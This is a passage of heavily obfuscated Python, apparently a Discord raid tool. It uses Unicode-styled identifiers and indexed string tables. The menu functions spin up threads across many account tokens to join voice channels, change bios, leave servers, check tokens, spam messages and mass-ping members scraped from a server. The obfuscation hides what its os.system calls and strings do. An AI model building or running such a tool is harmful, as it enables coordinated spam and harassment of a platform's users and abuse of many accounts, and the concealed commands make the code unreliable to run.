        𝘦𝙭𝙞𝘁 = 𝙞𝘯𝘱𝘂𝙩(𝘐𝗡𝗜𝘕𝗹𝗹𝙄𝘔𝙄𝘐𝙡𝗠𝗹𝘭𝘐𝘭𝙡𝘕𝗡𝗜𝙡𝘭𝙈𝗡𝗹𝙉𝙡𝙈𝗜𝘔𝗜𝗠[22])
        𝘦𝙭𝘪𝘁 = 𝙈𝙚𝘯𝘂().main_menu()
        𝘦𝙭𝙞𝙩()

    @𝘄𝘳𝘢𝘱𝘱𝗲𝗿
    def voicejoiner(self):
        𝙤𝘀.system(𝙄𝘕𝗜𝘕𝙡𝗹𝘐𝘔𝘐𝗜𝗹𝘔𝙡𝘭𝙄𝗹𝙡𝙉𝗡𝙄𝗹𝗹𝘔𝙉𝘭𝙉𝗹𝙈𝗜𝙈𝗜𝘔[387])
        𝗼𝙨.system(𝘐𝗡𝙄𝗡𝗹𝗹𝗜𝘔𝘐𝙄𝗹𝗠𝘭𝘭𝘐𝙡𝘭𝗡𝙉𝘐𝘭𝙡𝙈𝘕𝗹𝘕𝘭𝙈𝘐𝙈𝘐𝙈[1])
        𝗽𝙧𝘪𝙣𝘵(𝗺𝘦𝘯𝘂)
        𝙜𝘂𝙞𝘭𝘥 = 𝘪𝙣𝗽𝙪𝘁(f'{𝗿}{𝘐𝘕𝙄𝗡𝘭𝗹𝘐𝗠𝗜𝘐𝘭𝗠𝘭𝗹𝙄𝗹𝙡𝗡𝘕𝙄𝙡𝙡𝘔𝙉𝗹𝗡𝘭𝗠𝘐𝘔𝙄𝗠[91]}{𝗹𝙘}{𝙄𝗡𝗜𝗡𝘭𝗹𝙄𝙈𝘐𝗜𝗹𝗠𝙡𝙡𝘐𝙡𝗹𝘕𝘕𝗜𝗹𝙡𝗠𝗡𝘭𝗡𝙡𝙈𝘐𝗠𝗜𝘔[379]}{𝗿}{𝙄𝗡𝘐𝗡𝘭𝙡𝙄𝙈𝙄𝗜𝙡𝙈𝗹𝗹𝙄𝘭𝗹𝗡𝘕𝗜𝗹𝙡𝗠𝗡𝙡𝗡𝙡𝗠𝙄𝙈𝗜𝘔[365]}')
        if 𝗴𝙪𝙞𝙡𝙙 == 𝘐𝗡𝘐𝙉𝘭𝗹𝙄𝙈𝗜𝙄𝙡𝙈𝙡𝗹𝗜𝗹𝗹𝗡𝙉𝗜𝙡𝘭𝗠𝘕𝗹𝙉𝙡𝗠𝙄𝗠𝗜𝗠[22]:
            𝗠𝘦𝙣𝙪().main_menu()
        𝘤𝘩𝗮𝘯𝘯𝗲𝗹 = 𝗶𝗻𝗽𝘶𝘁(f'{𝗿}{𝙄𝗡𝙄𝗡𝙡𝗹𝘐𝙈𝗜𝙄𝗹𝘔𝗹𝙡𝘐𝙡𝙡𝗡𝙉𝙄𝗹𝗹𝘔𝗡𝗹𝗡𝙡𝗠𝗜𝙈𝙄𝘔[91]}{𝗹𝗰}{𝗜𝗡𝘐𝘕𝙡𝗹𝘐𝙈𝗜𝙄𝘭𝗠𝗹𝘭𝘐𝘭𝘭𝙉𝙉𝗜𝘭𝗹𝗠𝙉𝘭𝗡𝘭𝙈𝗜𝘔𝗜𝗠[373]}{𝙧}{𝘐𝘕𝗜𝙉𝗹𝘭𝗜𝗠𝗜𝘐𝘭𝘔𝗹𝗹𝘐𝘭𝘭𝙉𝗡𝘐𝙡𝗹𝙈𝘕𝘭𝙉𝙡𝙈𝙄𝗠𝗜𝙈[365]}')
        if 𝘤𝗵𝘢𝘯𝘯𝙚𝙡 == 𝘐𝗡𝘐𝗡𝗹𝘭𝗜𝘔𝘐𝗜𝘭𝗠𝗹𝗹𝘐𝘭𝘭𝗡𝙉𝗜𝙡𝙡𝗠𝘕𝙡𝙉𝗹𝗠𝙄𝘔𝗜𝙈[22]:
            𝘔𝙚𝘯𝘶().main_menu()
        𝙤𝘀.system(𝙄𝘕𝘐𝘕𝗹𝗹𝘐𝗠𝘐𝙄𝗹𝗠𝙡𝘭𝙄𝗹𝗹𝗡𝙉𝘐𝗹𝙡𝙈𝗡𝗹𝘕𝗹𝙈𝗜𝗠𝗜𝙈[1])
        𝘱𝙧𝘪𝘯𝙩(𝘮𝘦𝙣𝘶)
        for 𝘵𝗼𝗸𝘦𝗻 in 𝙩𝙤𝗸𝗲𝙣𝙨:
            𝘵𝘩𝙧𝙚𝗮𝙙𝙞𝗻𝗴.Thread(target=𝘃𝙘_𝗷𝗼𝗶𝗻𝗲𝗿, args=(𝙩𝗼𝘬𝘦𝘯, 𝘨𝙪𝙞𝗹𝘥, 𝘤𝙝𝗮𝗻𝗻𝘦𝗹)).start()
        𝘦𝘹𝙞𝘁 = 𝗶𝘯𝙥𝙪𝘵(𝙄𝙉𝙄𝘕𝗹𝘭𝗜𝘔𝗜𝙄𝘭𝘔𝗹𝘭𝗜𝗹𝗹𝘕𝗡𝘐𝘭𝗹𝘔𝘕𝘭𝗡𝘭𝘔𝙄𝙈𝘐𝗠[22])
        𝘦𝙭𝘪𝘵 = 𝘔𝗲𝙣𝘶().main_menu()
        𝗲𝙭𝗶𝘵()

    @𝘸𝘳𝗮𝘱𝗽𝗲𝗿
    def Change_bio(self):
        𝘰𝘀.system(𝙄𝙉𝘐𝗡𝙡𝗹𝗜𝘔𝗜𝙄𝘭𝗠𝙡𝙡𝘐𝗹𝘭𝘕𝗡𝗜𝗹𝘭𝙈𝙉𝗹𝙉𝗹𝗠𝙄𝘔𝙄𝙈[388])
        𝙤𝙨.system(𝘐𝙉𝙄𝘕𝘭𝗹𝘐𝘔𝘐𝘐𝙡𝘔𝙡𝙡𝘐𝗹𝗹𝙉𝗡𝙄𝘭𝘭𝘔𝘕𝗹𝘕𝗹𝙈𝗜𝘔𝙄𝙈[1])
        𝘱𝗿𝗶𝗻𝘁(𝗺𝗲𝙣𝙪)
        𝗯𝗶𝙤 = 𝗶𝙣𝗽𝙪𝘁(f'{𝙧}{𝗜𝙉𝘐𝗡𝘭𝗹𝗜𝙈𝘐𝙄𝘭𝗠𝙡𝗹𝗜𝙡𝗹𝘕𝗡𝗜𝘭𝗹𝗠𝗡𝘭𝙉𝗹𝘔𝗜𝙈𝙄𝙈[91]}{𝘭𝗰}{𝙄𝘕𝗜𝘕𝗹𝙡𝘐𝗠𝙄𝙄𝗹𝘔𝙡𝘭𝗜𝗹𝘭𝗡𝘕𝘐𝗹𝘭𝘔𝘕𝘭𝙉𝘭𝘔𝙄𝗠𝘐𝘔[389]}{𝘳}{𝘐𝘕𝗜𝗡𝘭𝘭𝗜𝗠𝗜𝗜𝗹𝘔𝘭𝘭𝙄𝘭𝗹𝗡𝙉𝗜𝗹𝗹𝙈𝗡𝙡𝗡𝙡𝘔𝗜𝗠𝗜𝙈[365]}')
        if 𝗯𝘪𝗼 == 𝘐𝙉𝙄𝘕𝘭𝙡𝙄𝙈𝙄𝗜𝙡𝘔𝙡𝗹𝘐𝗹𝙡𝗡𝘕𝗜𝘭𝗹𝗠𝙉𝙡𝗡𝙡𝙈𝘐𝙈𝙄𝘔[22]:
            𝘔𝘦𝙣𝘶().main_menu()
        𝘰𝘀.system(𝘐𝘕𝙄𝗡𝗹𝘭𝗜𝘔𝙄𝙄𝘭𝘔𝗹𝙡𝙄𝙡𝙡𝘕𝘕𝗜𝘭𝗹𝘔𝗡𝘭𝙉𝙡𝘔𝙄𝙈𝙄𝙈[1])
        𝙥𝙧𝙞𝗻𝘁(𝘮𝙚𝙣𝘶)
        for 𝘁𝘰𝗸𝗲𝗻 in 𝙩𝙤𝗸𝙚𝗻𝙨:
            𝙩𝙝𝘳𝗲𝘢𝘥𝘪𝗻𝙜.Thread(target=𝙗𝘪𝙤_𝘤𝙝𝙖𝘯𝘨𝙚𝘳, args=(𝘵𝙤𝗸𝗲𝙣, 𝗯𝙞𝙤)).start()
        𝙚𝙭𝙞𝙩 = 𝘪𝘯𝗽𝘂𝘵(𝗜𝘕𝗜𝙉𝗹𝘭𝙄𝗠𝗜𝗜𝙡𝘔𝗹𝗹𝙄𝗹𝗹𝙉𝗡𝙄𝗹𝘭𝘔𝗡𝙡𝗡𝙡𝗠𝙄𝗠𝗜𝙈[22])
        𝙚𝘅𝗶𝘵 = 𝗠𝙚𝗻𝙪().main_menu()
        𝗲𝙭𝘪𝘁()

    @𝘄𝘳𝙖𝘱𝙥𝙚𝗿
    def leaver(self):
        𝘰𝘀.system(𝘐𝗡𝙄𝗡𝙡𝗹𝙄𝗠𝘐𝙄𝙡𝗠𝗹𝘭𝗜𝘭𝘭𝘕𝙉𝗜𝙡𝘭𝗠𝗡𝘭𝘕𝙡𝙈𝙄𝙈𝘐𝗠[151])
        𝘰𝘀.system(𝗜𝙉𝙄𝘕𝗹𝙡𝘐𝘔𝘐𝗜𝘭𝘔𝗹𝗹𝙄𝘭𝙡𝗡𝙉𝙄𝘭𝘭𝘔𝘕𝗹𝘕𝘭𝗠𝗜𝗠𝘐𝗠[1])
        𝘱𝗿𝗶𝗻𝘵(𝘮𝘦𝘯𝙪)
        𝙜𝘶𝗶𝘭𝗱 = 𝘪𝘯𝘱𝘂𝘁(𝗰𝘰𝗻𝘴𝙤𝘭𝘦.prompt(𝘐𝙉𝗜𝗡𝘭𝗹𝘐𝙈𝙄𝙄𝘭𝘔𝗹𝗹𝙄𝘭𝘭𝘕𝙉𝘐𝘭𝗹𝙈𝘕𝘭𝗡𝙡𝘔𝙄𝙈𝘐𝘔[390]))
        if 𝗴𝙪𝙞𝙡𝗱 == 𝙄𝙉𝘐𝗡𝘭𝘭𝙄𝘔𝘐𝙄𝙡𝗠𝙡𝗹𝘐𝙡𝗹𝙉𝗡𝘐𝙡𝘭𝗠𝘕𝗹𝗡𝗹𝙈𝙄𝘔𝙄𝗠[22]:
            𝗠𝙚𝙣𝘶().main_menu()
        𝗮𝗿𝘨𝙨 = [(𝘵𝘰𝘬𝙚𝗻, 𝘨𝘂𝘪𝗹𝗱) for 𝙩𝗼𝗸𝗲𝘯 in 𝘵𝗼𝘬𝙚𝙣𝘴]
        𝙨𝙚𝗹𝙛.run(𝘴𝗲𝙡𝘧.raider.leaver, 𝙖𝘳𝘨𝘴)

    @𝘸𝙧𝗮𝘱𝙥𝗲𝙧
    def Checker(self):
        𝗼𝘴.system(𝙄𝗡𝗜𝘕𝘭𝗹𝗜𝗠𝗜𝗜𝘭𝙈𝙡𝘭𝗜𝗹𝗹𝙉𝗡𝘐𝙡𝗹𝗠𝙉𝙡𝘕𝘭𝗠𝗜𝘔𝗜𝗠[391])
        𝙨𝗮𝘃𝘦_𝘁𝘰𝙠𝘦𝘯𝘴(𝘐𝘕𝙄𝙉𝘭𝙡𝘐𝙈𝘐𝘐𝙡𝗠𝙡𝙡𝘐𝗹𝙡𝘕𝗡𝘐𝘭𝙡𝗠𝗡𝘭𝘕𝘭𝘔𝘐𝙈𝗜𝗠[59])
        𝙚𝙭𝙞𝙩 = 𝙞𝗻𝘱𝙪𝘵(𝙄𝘕𝗜𝗡𝗹𝙡𝘐𝙈𝘐𝙄𝙡𝙈𝗹𝘭𝙄𝗹𝘭𝙉𝘕𝙄𝙡𝘭𝙈𝗡𝘭𝗡𝘭𝗠𝘐𝙈𝙄𝘔[22])
        𝙚𝘹𝙞𝘵 = 𝘔𝘦𝗻𝘂().main_menu()
        𝙚𝙭𝗶𝘁()

    @𝘄𝗿𝙖𝙥𝗽𝙚𝘳
    def Onliner(self):
        𝗼𝘀.system(𝘐𝘕𝘐𝙉𝙡𝘭𝘐𝘔𝗜𝘐𝘭𝗠𝙡𝗹𝗜𝘭𝗹𝘕𝘕𝗜𝙡𝗹𝗠𝗡𝙡𝙉𝗹𝗠𝗜𝗠𝙄𝙈[392])
        𝘰𝙨.system(𝘐𝘕𝘐𝙉𝙡𝘭𝙄𝗠𝙄𝘐𝘭𝗠𝘭𝘭𝘐𝙡𝘭𝙉𝗡𝙄𝘭𝗹𝙈𝘕𝗹𝗡𝗹𝙈𝘐𝗠𝗜𝗠[1])
        𝙥𝙧𝗶𝙣𝘁(𝙢𝙚𝙣𝘂)
        for 𝘵𝗼𝙠𝗲𝗻 in 𝙩𝘰𝙠𝙚𝙣𝘴:
            𝘁𝙝𝘳𝘦𝙖𝗱𝘪𝘯𝘨.Thread(target=𝘰𝗻𝙡𝘪𝗻𝗲𝗿, args=𝘁𝙤𝗸𝗲𝗻).start()
        𝗽𝗿𝙞𝗻𝙩(f'{𝙧}{𝗜𝗡𝘐𝗡𝘭𝙡𝘐𝙈𝘐𝘐𝘭𝗠𝙡𝙡𝘐𝙡𝘭𝙉𝗡𝙄𝘭𝗹𝘔𝙉𝗹𝙉𝙡𝘔𝙄𝙈𝗜𝗠[91]}{𝗹𝗰}{𝘐𝙉𝘐𝘕𝗹𝙡𝗜𝗠𝗜𝘐𝙡𝙈𝗹𝙡𝘐𝗹𝙡𝗡𝘕𝗜𝘭𝘭𝗠𝘕𝗹𝘕𝗹𝗠𝗜𝘔𝗜𝗠[393]}{𝙧}{𝙄𝙉𝗜𝗡𝙡𝙡𝙄𝗠𝙄𝘐𝗹𝙈𝘭𝗹𝙄𝙡𝙡𝘕𝗡𝙄𝙡𝗹𝙈𝗡𝘭𝗡𝘭𝘔𝘐𝙈𝙄𝙈[394]}')
        𝘦𝘅𝘪𝘁 = 𝘪𝗻𝗽𝘂𝘁(𝙄𝗡𝗜𝗡𝘭𝘭𝘐𝗠𝗜𝙄𝙡𝘔𝗹𝘭𝗜𝙡𝘭𝙉𝗡𝘐𝗹𝗹𝘔𝗡𝗹𝙉𝗹𝘔𝗜𝗠𝘐𝙈[22])
        𝗲𝘹𝗶𝙩 = 𝙈𝘦𝙣𝘂().main_menu()
        𝙚𝙭𝗶𝙩()

    @𝘸𝘳𝘢𝗽𝗽𝘦𝙧
    def spammer(self):
        𝘰𝘴.system(𝙄𝘕𝙄𝙉𝙡𝘭𝙄𝙈𝘐𝘐𝙡𝘔𝗹𝗹𝗜𝗹𝙡𝗡𝗡𝘐𝗹𝘭𝙈𝘕𝗹𝗡𝙡𝗠𝙄𝗠𝗜𝘔[395])
        𝗺𝙖𝘴𝘀 = 𝘪𝗻𝗽𝙪𝙩(f'{𝘳}{𝗜𝗡𝗜𝘕𝘭𝗹𝘐𝘔𝘐𝘐𝗹𝗠𝘭𝗹𝘐𝗹𝘭𝙉𝘕𝘐𝗹𝘭𝙈𝘕𝙡𝙉𝗹𝗠𝗜𝙈𝗜𝗠[91]}{𝘭𝙘}{𝙄𝗡𝘐𝗡𝙡𝙡𝙄𝙈𝗜𝙄𝘭𝘔𝘭𝗹𝗜𝗹𝗹𝙉𝘕𝗜𝙡𝘭𝘔𝙉𝗹𝘕𝗹𝗠𝙄𝘔𝗜𝘔[396]}{𝙡𝙘}{𝙧}{𝘐𝘕𝘐𝗡𝗹𝗹𝙄𝙈𝗜𝘐𝘭𝘔𝘭𝙡𝙄𝙡𝙡𝙉𝗡𝗜𝘭𝗹𝙈𝗡𝘭𝙉𝘭𝘔𝙄𝗠𝙄𝙈[93]}{𝗴}{𝗜𝙉𝗜𝙉𝘭𝙡𝗜𝗠𝗜𝙄𝘭𝗠𝙡𝙡𝗜𝗹𝙡𝘕𝗡𝗜𝙡𝗹𝘔𝙉𝗹𝙉𝗹𝘔𝘐𝗠𝗜𝙈[97]}{𝘳}{𝘐𝘕𝙄𝗡𝘭𝙡𝙄𝗠𝗜𝗜𝗹𝙈𝗹𝗹𝘐𝘭𝗹𝗡𝘕𝗜𝙡𝙡𝘔𝘕𝘭𝙉𝗹𝙈𝗜𝙈𝘐𝗠[397]}')
        if 𝘮𝘢𝙨𝘀 == 𝗜𝗡𝙄𝙉𝘭𝗹𝗜𝗠𝗜𝙄𝗹𝘔𝘭𝗹𝘐𝙡𝘭𝘕𝘕𝗜𝘭𝘭𝙈𝙉𝙡𝘕𝗹𝘔𝙄𝘔𝙄𝙈[22]:
            𝘔𝙚𝗻𝘶().main_menu()
        𝗰𝙝𝙖𝗻𝘯𝘦𝙡 = 𝘪𝘯𝘱𝘂𝙩(f'{𝘳}{𝘐𝙉𝙄𝘕𝙡𝙡𝙄𝙈𝙄𝗜𝗹𝙈𝘭𝙡𝙄𝙡𝘭𝘕𝗡𝙄𝘭𝘭𝙈𝙉𝗹𝗡𝘭𝙈𝗜𝗠𝗜𝙈[91]}{𝘭𝘤}{𝘐𝙉𝙄𝗡𝗹𝘭𝙄𝗠𝙄𝘐𝙡𝗠𝗹𝙡𝙄𝗹𝗹𝘕𝘕𝘐𝙡𝘭𝙈𝗡𝙡𝘕𝘭𝙈𝙄𝗠𝘐𝘔[373]}{𝙡𝙘}{𝗿}{𝙄𝙉𝗜𝘕𝘭𝘭𝙄𝙈𝗜𝙄𝗹𝗠𝗹𝗹𝗜𝗹𝘭𝙉𝘕𝗜𝙡𝙡𝘔𝗡𝗹𝗡𝙡𝗠𝘐𝘔𝘐𝗠[93]}{𝗿}{𝘐𝗡𝙄𝙉𝗹𝗹𝘐𝘔𝘐𝘐𝙡𝙈𝘭𝘭𝘐𝙡𝗹𝘕𝘕𝗜𝙡𝘭𝘔𝗡𝘭𝙉𝘭𝙈𝗜𝙈𝗜𝙈[398]}')
        if 𝗰𝘩𝙖𝙣𝘯𝙚𝘭 == 𝗜𝙉𝙄𝗡𝙡𝗹𝘐𝘔𝙄𝗜𝙡𝗠𝘭𝘭𝙄𝙡𝙡𝘕𝘕𝘐𝘭𝗹𝗠𝗡𝘭𝙉𝗹𝙈𝙄𝗠𝗜𝗠[22]:
            𝙈𝘦𝙣𝙪().main_menu()
        𝗺𝙚𝘀𝘀𝙖𝘨𝘦 = 𝙞𝙣𝙥𝙪𝘁(f'{𝘳}{𝙄𝘕𝙄𝗡𝙡𝘭𝗜𝗠𝗜𝗜𝘭𝘔𝙡𝙡𝘐𝗹𝘭𝙉𝗡𝘐𝘭𝙡𝗠𝘕𝘭𝙉𝗹𝘔𝙄𝙈𝗜𝘔[91]}{𝙡𝘤}{𝗜𝘕𝘐𝘕𝗹𝘭𝘐𝗠𝘐𝘐𝗹𝘔𝙡𝗹𝙄𝘭𝙡𝙉𝙉𝙄𝗹𝘭𝙈𝗡𝘭𝙉𝘭𝗠𝗜𝙈𝗜𝘔[375]}{𝗹𝗰}{𝗿}{𝘐𝙉𝘐𝙉𝙡𝘭𝙄𝗠𝘐𝘐𝗹𝙈𝘭𝙡𝗜𝗹𝗹𝙉𝘕𝘐𝗹𝘭𝙈𝘕𝙡𝘕𝙡𝗠𝙄𝙈𝘐𝗠[93]}{𝘳}{𝗜𝗡𝙄𝗡𝘭𝘭𝘐𝘔𝗜𝙄𝗹𝙈𝗹𝗹𝘐𝙡𝗹𝗡𝘕𝙄𝘭𝗹𝘔𝗡𝗹𝗡𝗹𝗠𝙄𝘔𝗜𝙈[398]}')
        if 𝙢𝗲𝘴𝘀𝗮𝗴𝙚 == 𝗜𝗡𝙄𝙉𝘭𝗹𝙄𝘔𝙄𝗜𝗹𝗠𝘭𝙡𝘐𝗹𝗹𝘕𝙉𝗜𝗹𝗹𝗠𝙉𝘭𝗡𝙡𝘔𝘐𝘔𝗜𝗠[22]:
            𝗠𝙚𝘯𝘂().main_menu()
        𝗱𝗲𝗹𝗮𝘆 = 𝘚𝘰𝘸𝙀5𝗝𝘚3𝙥𝗗𝘑𝗚𝘔𝗹𝙆𝘤𝘡𝘨𝗵7𝘠𝘻𝗼𝘩𝗨4𝙒_𝙦𝘎𝙄𝗡.mro()[9](𝘪𝗻𝘱𝙪𝘵(f'{𝗿}{𝘐𝘕𝗜𝙉𝙡𝘭𝗜𝗠𝙄𝙄𝗹𝘔𝗹𝗹𝗜𝙡𝗹𝙉𝘕𝗜𝘭𝘭𝗠𝘕𝘭𝗡𝘭𝘔𝗜𝗠𝘐𝙈[91]}{𝗹𝘤}{𝗜𝗡𝗜𝙉𝘭𝗹𝘐𝙈𝗜𝘐𝙡𝘔𝘭𝙡𝙄𝘭𝙡𝙉𝙉𝘐𝙡𝗹𝘔𝙉𝘭𝙉𝗹𝙈𝗜𝙈𝙄𝘔[399]}{𝘭𝙘}{𝗿}{𝙄𝘕𝘐𝙉𝗹𝘭𝙄𝘔𝙄𝘐𝘭𝘔𝙡𝙡𝘐𝙡𝙡𝗡𝘕𝙄𝗹𝘭𝙈𝙉𝙡𝘕𝙡𝗠𝗜𝙈𝗜𝘔[93]}{𝘳}{𝘐𝘕𝗜𝙉𝗹𝙡𝗜𝘔𝗜𝙄𝙡𝘔𝙡𝘭𝗜𝗹𝘭𝗡𝗡𝘐𝘭𝗹𝘔𝗡𝙡𝘕𝗹𝘔𝙄𝙈𝙄𝗠[398]}'))
        if 𝗱𝗲𝘭𝘢𝘆 == 𝙄𝗡𝗜𝙉𝙡𝙡𝗜𝗠𝘐𝗜𝗹𝙈𝗹𝗹𝙄𝙡𝗹𝗡𝘕𝗜𝘭𝙡𝙈𝘕𝘭𝗡𝗹𝙈𝗜𝗠𝘐𝙈[22]:
            𝘔𝘦𝙣𝘂().main_menu()
        if 𝙢𝘢𝘴𝘴 == 𝙄𝙉𝗜𝗡𝙡𝘭𝘐𝘔𝘐𝙄𝘭𝙈𝙡𝙡𝙄𝙡𝙡𝙉𝗡𝘐𝘭𝗹𝘔𝘕𝗹𝗡𝙡𝗠𝙄𝘔𝙄𝗠[400]:
            𝗴𝘂𝘪𝙡𝘥𝗶𝘥 = 𝗶𝗻𝙥𝘶𝘁(f'{𝙧}{𝗜𝗡𝗜𝙉𝘭𝗹𝙄𝙈𝗜𝘐𝘭𝗠𝗹𝗹𝗜𝙡𝙡𝘕𝙉𝙄𝗹𝙡𝙈𝘕𝗹𝗡𝗹𝙈𝘐𝘔𝘐𝙈[91]}{𝗹𝙘}{𝙄𝗡𝗜𝘕𝗹𝗹𝗜𝙈𝘐𝘐𝘭𝗠𝘭𝘭𝗜𝗹𝙡𝘕𝘕𝘐𝘭𝙡𝗠𝙉𝘭𝗡𝙡𝗠𝗜𝗠𝘐𝗠[379]}{𝘳}{𝗜𝗡𝘐𝘕𝗹𝘭𝗜𝘔𝗜𝗜𝗹𝘔𝙡𝙡𝘐𝙡𝗹𝘕𝗡𝙄𝘭𝙡𝗠𝗡𝘭𝙉𝗹𝘔𝘐𝙈𝙄𝗠[365]}')
            if 𝘨𝙪𝙞𝗹𝗱𝗶𝙙 == 𝘐𝗡𝗜𝙉𝙡𝙡𝘐𝗠𝙄𝘐𝙡𝘔𝘭𝗹𝙄𝙡𝙡𝙉𝘕𝘐𝙡𝙡𝗠𝙉𝘭𝙉𝘭𝙈𝗜𝙈𝙄𝗠[22]:
                𝙈𝗲𝘯𝘶().main_menu()
            𝗽𝗶𝘯𝙜𝘀 = 𝗡𝘵1𝗰𝗖4𝘒𝘈3𝙓𝘉𝙋𝘻𝗚𝙔62𝗪𝙍𝘒𝙣𝗘𝗶𝗘𝘩𝘇𝘳𝗶𝙉2𝗻𝘳.mro()[9](𝗶𝗻𝗽𝘶𝙩(f'{𝗿}{𝗜𝗡𝗜𝗡𝙡𝗹𝙄𝗠𝙄𝗜𝘭𝗠𝘭𝗹𝙄𝗹𝘭𝘕𝙉𝘐𝘭𝘭𝙈𝘕𝘭𝗡𝗹𝘔𝙄𝘔𝙄𝗠[91]}{𝙡𝘤}{𝘐𝗡𝘐𝙉𝙡𝙡𝘐𝗠𝙄𝘐𝘭𝙈𝙡𝘭𝘐𝘭𝘭𝙉𝙉𝗜𝗹𝗹𝘔𝙉𝙡𝘕𝗹𝙈𝙄𝗠𝗜𝙈[401]}{𝗹𝗰}{𝙧}{𝙄𝘕𝗜𝗡𝗹𝘭𝙄𝘔𝗜𝘐𝗹𝙈𝙡𝙡𝘐𝘭𝘭𝙉𝗡𝙄𝘭𝙡𝘔𝗡𝘭𝘕𝗹𝙈𝗜𝘔𝗜𝘔[365]}'))
            if 𝙥𝘪𝘯𝙜𝘀 == 𝙄𝗡𝗜𝙉𝙡𝗹𝘐𝙈𝘐𝘐𝙡𝘔𝘭𝘭𝘐𝙡𝙡𝘕𝗡𝙄𝗹𝘭𝙈𝘕𝘭𝘕𝘭𝙈𝗜𝘔𝘐𝗠[22]:
                𝘔𝗲𝗻𝙪().main_menu()
            𝗽𝘳𝘪𝘯𝘵(f'{𝗿}{𝙄𝙉𝙄𝗡𝙡𝙡𝙄𝗠𝙄𝗜𝗹𝗠𝘭𝙡𝙄𝘭𝘭𝘕𝗡𝙄𝙡𝘭𝙈𝗡𝙡𝘕𝘭𝙈𝙄𝘔𝘐𝘔[91]}{𝙡𝙘}{𝙄𝗡𝗜𝘕𝘭𝘭𝘐𝙈𝗜𝗜𝗹𝗠𝙡𝘭𝙄𝙡𝗹𝙉𝙉𝘐𝘭𝙡𝙈𝙉𝙡𝗡𝘭𝘔𝗜𝘔𝗜𝙈[402]}{𝗹𝙘}{𝗿}{𝙄𝙉𝙄𝗡𝘭𝗹𝙄𝙈𝗜𝘐𝘭𝙈𝙡𝙡𝙄𝗹𝙡𝗡𝙉𝘐𝙡𝙡𝘔𝙉𝗹𝗡𝗹𝙈𝗜𝘔𝙄𝙈[93]}{𝙜}{𝘐𝗡𝙄𝘕𝙡𝙡𝗜𝘔𝗜𝘐𝘭𝘔𝙡𝘭𝗜𝘭𝗹𝙉𝙉𝙄𝗹𝗹𝙈𝗡𝘭𝗡𝗹𝗠𝗜𝗠𝘐𝙈[403]}')
            𝘴𝗰𝘳𝙖𝙥𝙚𝗿(𝘨𝘶𝗶𝘭𝙙𝗶𝗱, 𝙘𝘩𝙖𝙣𝘯𝗲𝘭)
            𝗼𝙨.system(𝙄𝘕𝘐𝘕𝗹𝙡𝘐𝘔𝙄𝗜𝘭𝗠𝘭𝘭𝙄𝙡𝗹𝙉𝘕𝘐𝗹𝗹𝗠𝗡𝘭𝗡𝗹𝙈𝘐𝗠𝙄𝗠[1])
            𝗽𝙧𝘪𝘯𝘵(𝙢𝙚𝙣𝘂)
            for 𝙩𝘰𝙠𝗲𝗻 in 𝙩𝘰𝘬𝘦𝗻𝘀:
                𝘁𝗵𝗿𝗲𝙖𝘥𝙞𝗻𝗴.Thread(target=𝗺𝙖𝘀𝙨𝘱𝙞𝘯𝗴, args=(𝙩𝗼𝘬𝗲𝙣, 𝙘𝙝𝗮𝗻𝙣𝙚𝘭, 𝘮𝙚𝘀𝙨𝗮𝘨𝙚, 𝘥𝗲𝙡𝘢𝘆, 𝙥𝘪𝙣𝗴𝘴)).start()
            𝘦𝘹𝘪𝘵 = 𝗶𝘯𝙥𝙪𝘁(𝗜𝘕𝙄𝙉𝙡𝗹𝗜𝗠𝙄𝘐𝗹𝗠𝙡𝙡𝙄𝙡𝙡𝙉𝘕𝗜𝗹𝙡𝘔𝘕𝗹𝘕𝗹𝙈𝘐𝗠𝙄𝗠[22])
            𝘦𝘹𝘪𝘵 = 𝙈𝘦𝗻𝙪().main_menu()
            𝗲𝙭𝘪𝘁()
        if 𝙢𝙖𝙨𝘀 == 𝙄𝗡𝙄𝙉𝗹𝗹𝙄𝙈𝙄𝙄𝙡𝘔𝙡𝙡𝙄𝘭𝙡𝘕𝘕𝘐𝙡𝘭𝗠𝗡𝙡𝗡𝗹𝘔𝙄𝗠𝘐𝘔[404]:
            𝘰𝘴.system(𝗜𝗡𝙄𝘕𝙡𝗹𝘐𝙈𝗜𝗜𝙡𝙈𝘭𝗹𝗜𝙡𝘭𝘕𝗡𝙄𝘭𝗹𝙈𝙉𝙡𝙉𝙡𝙈𝙄𝗠𝙄𝘔[1])
            𝗽𝘳𝘪𝙣𝙩(𝘮𝘦𝗻𝙪)
            for 𝙩𝗼𝙠𝙚𝙣 in 𝙩𝗼𝘬𝘦𝙣𝘀:
                𝘁𝗵𝙧𝗲𝙖𝘥𝘪𝙣𝘨.Thread(target=𝙨𝘱𝗮𝗺𝘮𝗲𝘳, args=(𝙩𝗼𝙠𝘦𝗻, 𝘤𝘩𝙖𝙣𝘯𝙚𝘭, 𝘮𝘦𝘴𝘴𝘢𝗴𝙚, 𝙙𝙚𝘭𝗮𝙮)).start()
            𝗲𝘅𝘪𝘁 = 𝘪𝙣𝙥𝘂𝙩(𝗜𝗡𝘐𝗡𝘭𝘭𝘐𝙈𝙄𝙄𝙡𝙈𝗹𝗹𝗜𝘭𝙡𝙉𝗡𝗜𝙡𝘭𝙈𝙉𝗹𝘕𝗹𝙈𝙄𝗠𝙄𝘔[22])
            𝗲𝙭𝘪𝘁 = 𝘔𝗲𝘯𝘶().main_menu()
            𝙚𝘅𝘪𝙩()

    @𝘄𝙧𝗮𝙥𝗽𝘦𝗿
    def exit(self):
        𝘰𝘴.system(𝙄𝙉𝙄𝗡𝗹𝘭𝘐𝗠𝗜𝙄𝙡𝘔𝙡𝘭𝘐𝘭𝙡𝗡𝗡𝗜𝙡𝙡𝙈𝘕𝙡𝗡𝙡𝘔𝘐𝘔𝗜𝗠[1])
        𝘰𝘀.system(𝘐𝗡𝗜𝗡𝙡𝘭𝗜𝘔𝗜𝘐𝙡𝘔𝗹𝙡𝗜𝗹𝙡𝙉𝙉𝙄𝗹𝙡𝘔𝗡𝗹𝙉𝙡𝗠𝘐𝗠𝗜𝗠[405])
        𝘤𝘰𝗻𝘀𝗼𝘭𝘦.render_ascii()
        𝗲𝙭𝘪𝙩()

if __𝗻𝘢𝘮𝙚__ == 𝘐𝙉𝘐𝘕𝘭𝗹𝗜𝙈𝙄𝙄𝗹𝙈𝘭𝙡𝙄𝘭𝙡𝙉𝗡𝙄𝙡𝗹𝘔𝗡𝗹𝘕𝙡𝗠𝘐𝙈𝗜𝗠[406]:
    𝗠𝘦𝘯𝙪().main_menu()